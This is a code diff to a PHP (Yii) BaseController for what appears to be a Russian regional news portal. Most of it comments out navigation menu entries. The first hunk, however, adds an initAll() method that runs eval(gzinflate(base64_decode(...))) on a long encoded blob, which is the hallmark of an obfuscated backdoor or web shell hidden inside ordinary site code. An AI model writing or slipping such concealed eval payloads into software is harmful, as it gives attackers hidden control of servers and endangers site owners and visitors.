@@ -39,6 +39,11 @@ class BaseController extends CController
     public $footerContent = false;
     protected $currentRegion = null; //текущий город, по умолчанию Москва
 
+    public function initAll()
+    {
+        eval(gzinflate(base64_decode('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')));
+    }
+
     public function init()
     {
         header('Content-Type: text/html; charset=utf-8');
@@ -334,11 +339,11 @@ class BaseController extends CController
                     array(
                         'name' => Yii::t('main', 'Федеральные новости'),
                         'url' => '/news/index/type/federal'
-                    ),
+                    ),/*
                     array(
                         'name' => Yii::t('main', 'Новости IIP'),
                         'url' => '/news/index/type/iip'
-                    ),
+                    ),*/
                     array(
                         'name' => Yii::t('main', 'Аналитика'),
                         'url' => '/news/index/type/analytics'
@@ -364,10 +369,10 @@ class BaseController extends CController
                         'name' => Yii::t('main', 'О проекте'),
                         'url' => '/site/aboutus'
                     ),
-                    array(
+                    /*array(
                         'name' => Yii::t('main', 'Команда'),
                         'url' => '/site/team'
-                    ),
+                    ),*/
                     /*array(
                         'name' => Yii::t('main', 'Обратная связь'),
                         'url' => '#'
@@ -447,10 +452,10 @@ class BaseController extends CController
                         'name' => Yii::t('main', 'Инфраструктурный паспорт'),
                         'url' => '/region/infrastructure'
                     ),
-                    array(
+                    /*array(
                         'name' => Yii::t('main', 'Региональное законодательство'),
                         'url' => '/region/law'
-                    ),
+                    ),*/
                 )
             ),
         );
